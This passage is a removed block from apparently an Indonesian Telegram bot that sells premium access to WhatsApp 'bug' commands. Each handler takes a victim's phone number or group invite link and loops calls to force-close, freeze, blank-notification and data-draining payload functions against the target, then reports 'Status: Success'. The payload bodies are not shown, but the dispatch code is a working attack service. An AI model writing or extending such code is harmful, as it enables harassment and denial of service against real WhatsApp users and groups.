-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Delay Sedot KoutaV2
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i < 100; i++) {
-          await bulldozerX(sock, target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] SLOWNESS ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Slowness error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Slowness ERROR:", err)
-  }
-});
-
-bot.onText(/\/Slowness(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Slowness 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Delay Sedot KoutaV3
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i < 100; i++) {
-          await X7Bulldozer(sock, target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] Zombiee ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Zombiee error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Zombiee ERROR:", err)
-  }
-});
-
-
-bot.onText(/\/Dior(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Dior 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Ui System
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i <50; i++) {
-          await button(sock, target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] Dior ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Dior error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Dior ERROR:", err)
-  }
-});
-
-bot.onText(/\/Darkness(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Darkness 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Blank Notif + Freeze 
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i <50; i++) {
-          await X7Blank(target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] Darkness ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Darkness error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Darkness ERROR:", err)
-  }
-});
-
-bot.onText(/\/Xiosr(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Xiosr 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Blank Click
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i <50; i++) {
-          await stickerUi(sock, target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] Xiosr ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Xiosr error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Xiosr ERROR:", err)
-  }
-});
-
-bot.onText(/\/Catally(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Catally 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Force Close ( No Work All Divice)
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i <50; i++) {
-          await X7Forclose(sock, target)
-        }
-
-        console.log(`[SUCCESS] Catally ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Catally error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Catally ERROR:", err)
-  }
-});
-
-bot.onText(/\/Craryz(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Craryz 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Force Close ( No Work All Divice)
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i <50; i++) {
-          await X7ForcloseCombo(sock, target)
-        }
-
-        console.log(`[SUCCESS] Craryz ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("Craryz error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("Craryz ERROR:", err)
-  }
-});
-
-bot.onText(/\/Crazzy(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /Crazzy 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Force Close Click 
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i < 5; i++) {
-          await X7Klik(sock, target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] ForceInvinity ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("ForceInvinity error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("delay ERROR:", err)
-  }
-});
-
-bot.onText(/\/zombies(?:\s+(\d+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-
-    const randomImage = getRandomImage()
-
-    // cek premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM
-
-User : ${username}
-Status : Premium Required
-
-Hubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
-          ]
-        }
-      });
-    }
-
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "Format salah\nContoh: /zombies 628xxxx")
-    }
-
-    const targetNumber = match[1]
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
-    const target = `${formattedNumber}@s.whatsapp.net`
-    const date = getCurrentDate()
-
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
-▹ Target : ${formattedNumber}
-▹ Type Bug : Force Close Click 
-▹ Status : Success
-▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
-        ]
-      }
-    });
-
-    setTimeout(async () => {
-      try {
-
-        for (let i = 0; i < 50; i++) {
-          await Woam(target);
-          await sleep(1500)
-        }
-
-        console.log(`[SUCCESS] ForceInvinity ${formattedNumber}`)
-
-      } catch (err) {
-        console.log("ForceInvinity error:", err)
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("delay ERROR:", err)
-  }
-});
-
-bot.onText(/\/Cursed(?:\s+(https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9]+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-    const randomImage = getRandomImage()
-
-    // 1. Cek Premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]]
-        }
-      });
-    }
-
-    // 2. Validasi Link Grup
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/Cursed https://chat.whatsapp.com/KODE_GRUP`", { parse_mode: "Markdown" })
-    }
-
-    const groupLink = match[1]
-    const inviteCode = groupLink.split('whatsapp.com/')[1] // Mengambil kode invite
-    const date = getCurrentDate()
-
-    // 3. Cek Cooldown & Session
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    // 4. Response Telegram
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐆͢𝐑͢𝐎͢𝐔͢𝐏 」⊰—═⬡\n
-      ▹ Type Bug : Fc Click Group
-      ▹ Type : Group Link Attack\n
-      ▹ Code : ${inviteCode}\n
-      ▹ Status : Executing...\n
-      ▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [[{ text: "CHECK GROUP", url: groupLink }]]
-      }
-    });
-
-    // 5. Eksekusi WhatsApp (Async Process)
-    setTimeout(async () => {
-      try {
-        // Ambil session pertama yang tersedia
-        const [sock] = sessions.values() 
-
-        // Join ke grup terlebih dahulu menggunakan kode invite
-        const groupMetadata = await sock.groupAcceptInvite(inviteCode)
-        const groupJid = groupMetadata // ID Grup biasanya berbentuk '123456@g.us'
-
-        if (groupJid) {
-          for (let i = 0; i < 5; i++) {
-            // Gunakan fungsi bug anda (pastikan fungsi tersebut support JID grup)
-            await X7Klik(sock, groupJid); 
-            await sleep(1500)
-          }
-          console.log(`[SUCCESS] Group Attack: ${groupJid}`)
-        }
-
-      } catch (err) {
-        console.log("Group Attack Error:", err)
-        bot.sendMessage(chatId, "❌ Gagal join grup atau link tidak valid.")
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("fc gb ERROR:", err)
-  }
-});
-
-bot.onText(/\/Light(?:\s+(https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9]+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-    const randomImage = getRandomImage()
-
-    // 1. Cek Premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/pinzyoffc" }]]
-        }
-      });
-    }
-
-    // 2. Validasi Link Grup
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/Light https://chat.whatsapp.com/KODE_GRUP`", { parse_mode: "Markdown" })
-    }
-
-    const groupLink = match[1]
-    const inviteCode = groupLink.split('whatsapp.com/')[1] // Mengambil kode invite
-    const date = getCurrentDate()
-
-    // 3. Cek Cooldown & Session
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    // 4. Response Telegram
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐆͢𝐑͢𝐎͢𝐔͢𝐏 」⊰—═⬡\n
-      ▹ Type Bug : Fc Click Group
-      ▹ Type : Group Link Attack\n
-      ▹ Status : Executing...\n
-      ▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [[{ text: "CHECK GROUP", url: groupLink }]]
-      }
-    });
-
-    // 5. Eksekusi WhatsApp (Async Process)
-    setTimeout(async () => {
-      try {
-        // Ambil session pertama yang tersedia
-        const [sock] = sessions.values() 
-
-        // Join ke grup terlebih dahulu menggunakan kode invite
-        const groupMetadata = await sock.groupAcceptInvite(inviteCode)
-        const groupJid = groupMetadata // ID Grup biasanya berbentuk '123456@g.us'
-
-        if (groupJid) {
-          for (let i = 0; i < 50; i++) {
-            // Gunakan fungsi bug anda (pastikan fungsi tersebut support JID grup)
-            await tesyu(sock, groupJid);
-            await sleep(1500)
-          }
-          console.log(`[SUCCESS] Group Attack: ${groupJid}`)
-        }
-
-      } catch (err) {
-        console.log("Group Attack Error:", err)
-        bot.sendMessage(chatId, "❌ Gagal join grup atau link tidak valid.")
-      }
-    }, 100)
-
-  } catch (err) {
-    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
-    console.log("ERROR:", err)
-  }
-});
-
-bot.onText(/\/Empire(?:\s+(https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9]+))?/i, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id
-    const senderId = msg.from.id
-    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"
-    const randomImage = getRandomImage()
-
-    // 1. Cek Premium
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/pinzyoffc" }]]
-        }
-      });
-    }
-
-    // 2. Validasi Link Grup
-    if (!match || !match[1]) {
-      return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/Empire https://chat.whatsapp.com/KODE_GRUP`", { parse_mode: "Markdown" })
-    }
-
-    const groupLink = match[1]
-    const inviteCode = groupLink.split('whatsapp.com/')[1] // Mengambil kode invite
-    const date = getCurrentDate()
-
-    // 3. Cek Cooldown & Session
-    const cooldown = checkCooldown(senderId)
-    if (cooldown > 0) {
-      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
-    }
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
-    }
-
-    // 4. Response Telegram
-    await bot.sendPhoto(chatId, randomImage, {
-      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐆͢𝐑͢𝐎͢𝐔͢𝐏 」⊰—═⬡\n
-      ▹ Type : Group Link Attack\n
-      ▹ Type Bug : Blank Group 
-      ▹ Code : ${inviteCode}\n
-      ▹ Status : Executing...\n
-      ▹ Date : ${date}</blockquote>`,
-      parse_mode: "HTML", 
-      reply_markup: {
-        inline_keyboard: [[{ text: "CHECK GROUP", url: groupLink }]]
-      }
-    });
-
-    // 5. Eksekusi WhatsApp (Async Process)
-    setTimeout(async () => {
-      try {
-        // Ambil session pertama yang tersedia
-        const [sock] = sessions.values() 
-
-        // Join ke grup terlebih dahulu menggunakan kode invite
-        const groupMetadata = await sock.groupAcceptInvite(inviteCode)
-        const groupJid = groupMetadata // ID Grup biasanya berbentuk '123456@g.us'
-
-        if (groupJid) {
-          for (let i = 0; i < 10; i++) {
-            // Gunakan fungsi bug anda (pastikan fungsi tersebut support JID grup)
-            await NvXStuckLogo(sock, groupJid);
-          }
-          console.log(`[SUCCESS] Group Attack: ${groupJid}`)
-        }
-
-      } catch (err) {
-        console.log("Group Attack Error:", err)
